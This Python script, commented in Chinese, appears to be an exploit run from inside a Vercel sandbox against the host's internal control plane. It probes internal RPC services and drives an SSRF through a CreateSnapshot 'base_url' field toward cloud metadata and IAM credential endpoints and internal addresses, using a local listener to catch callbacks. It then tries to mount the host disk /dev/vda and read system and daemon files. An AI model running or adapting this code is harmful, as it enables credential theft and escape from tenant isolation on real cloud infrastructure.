# -*- coding: utf-8 -*-
"""v3b_cell_ssrf: CreateSnapshot base_url SSRF 全链 (v2, 机灵版)
通道: TCP 127.0.0.1:23456 直连 host 控制面 (V21/V22 确认 ALIVE), unix 路径对照
顺序: 观测服务器 -> P2 ALIVE(TCP+unix) -> P3 SSRF(base_url 五目标) -> P4 mount vda(线程超时) -> P1/P5 文件
每步容错, 哨兵 V3P_DONE 必达"""
import os, time, socket, ctypes, glob, sys, threading, json

OUT = '/vercel/sandbox/v3b.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc(host, port, path, body='{}', t=6):
    """TCP connectrpc POST (connectrpc 风格路径), 返回 (状态行, body 前 400B)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((host, port))
        req = ('POST %s HTTP/1.1\r\nHost: %s:%d\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, host, port, len(body)))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def rpc_unix(sockpath, path, body='{}', t=6):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, len(body)))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    # 0) 观测服务器 (host 若同 netns fetch 127.0.0.1:18080 会命中)
    OBS = []
    try:
        import http.server
        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                OBS.append(self.path)
                self.send_response(200)
                self.send_header('Content-Length', '2')
                self.end_headers()
                self.wfile.write(b'ok')
            def log_message(self, *a):
                pass
        srv = http.server.HTTPServer(('127.0.0.1', 18080), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        log('observe 127.0.0.1:18080 up')
    except Exception as e:
        log('observe FAIL %s' % e)

    # 1) P2: RPC ALIVE 矩阵 (TCP 23456 优先 + unix 对照)
    log('=== P2 RPC ALIVE (TCP 127.0.0.1:23456) ===')
    paths = [
        '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage',
        '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot',
        '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
        '/vercel.hive.cell.api.processes.v1.ProcessService/Wait',
        '/vercel.hive.celld.api.v1.CelldService/Heartbeat',
    ]
    for p in paths:
        st, bd = rpc('127.0.0.1', 23456, p, '{}')
        log('TCP %-45s -> %s | %s' % (p.split('/')[-1], st, bd[:150].replace('\n', ' ')))
        time.sleep(0.3)
    # 尝试本机 IP 与 hostname IP
    try:
        import subprocess
        ips = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=5)
        for ip in (ips.stdout or '').split():
            st, bd = rpc(ip.strip(), 23456, paths[0], '{}')
            log('IP %-18s 23456 -> %s | %s' % (ip.strip(), st, bd[:120].replace('\n', ' ')))
            break
    except Exception as e:
        log('hostname -I err %s' % e)
    # unix 对照 (可能死文件, 快速失败)
    for sp in ['/mnt/vdax/run/cell/cell.sock', '/run/cell/cell.sock', '/vercel/run/cell.sock']:
        st, bd = rpc_unix(sp, paths[0], '{}', t=3)
        log('UNIX %-32s -> %s' % (sp, st))

    # 2) P3: CreateSnapshot base_url SSRF (关键!)
    log('=== P3 CreateSnapshot base_url SSRF ===')
    DID = 'a' * 32
    targets = [
        'http://127.0.0.1:18080/probe/local',
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://172.31.0.2/',
        'http://100.64.0.1/',
        'http://8.8.8.8/',
        'http://127.0.0.1:18080/probe/again',
    ]
    for url in targets:
        for fld in ['base_url']:
            body = json.dumps({'drive_id': DID, fld: url})
            t0 = time.time()
            st, bd = rpc('127.0.0.1', 23456, '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot', body, t=8)
            dt = time.time() - t0
            log('url %-58s -> %s (%.1fs) | %s | obs=%d' % (url, st, dt, bd[:120].replace('\n', ' '), len(OBS)))
            time.sleep(1.0)
    log('OBS all: %s' % OBS)

    # 3) P4: mount /dev/vda (线程 + 25s 超时, 失败不阻塞)
    log('=== P4 mount vda ===')
    MOUNTED = [False]
    def _mount():
        try:
            os.makedirs('/mnt/vdax', exist_ok=True)
            ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
            log('mount ret=%d' % ret)
            MOUNTED[0] = (ret == 0)
        except Exception as e:
            log('mount EXC %s' % e)
    t = threading.Thread(target=_mount, daemon=True)
    t.start()
    t.join(25)
    if t.is_alive():
        log('mount TIMEOUT(25s), skip vda')

    # 4) P1/P5: 系统标识 + celld 文件 (仅 mount 成功时)
    if MOUNTED[0]:
        log('=== P1 系统标识 ===')
        for p in ['/mnt/vdax/etc/os-release', '/mnt/vdax/etc/hostname', '/mnt/vdax/etc/hosts']:
            try:
                log('%s: %s' % (p, open(p, errors='replace').read()[:400].replace('\n', ' | ')))
            except Exception as e:
                log('%s ERR %s' % (p, e))
        log('=== P5 celld 文件 ===')
        for p in ['/mnt/vdax/opt/vercel/celld-init.sh', '/mnt/vdax/opt/vercel/celld',
                  '/mnt/vdax/opt/vercel/meta.db', '/mnt/vdax/usr/bin/ctr']:
            try:
                st = os.stat(p)
                log('%s size=%d' % (p, st.st_size))
                if p.endswith('.sh'):
                    log('  %s' % open(p, errors='replace').read()[:600].replace('\n', ' | '))
            except Exception as e:
                log('%s ERR %s' % (p, e))
    else:
        log('vda not mounted, skip P1/P5')

    log('V3P_DONE')
    f.close()


if __name__ == '__main__':
    main()
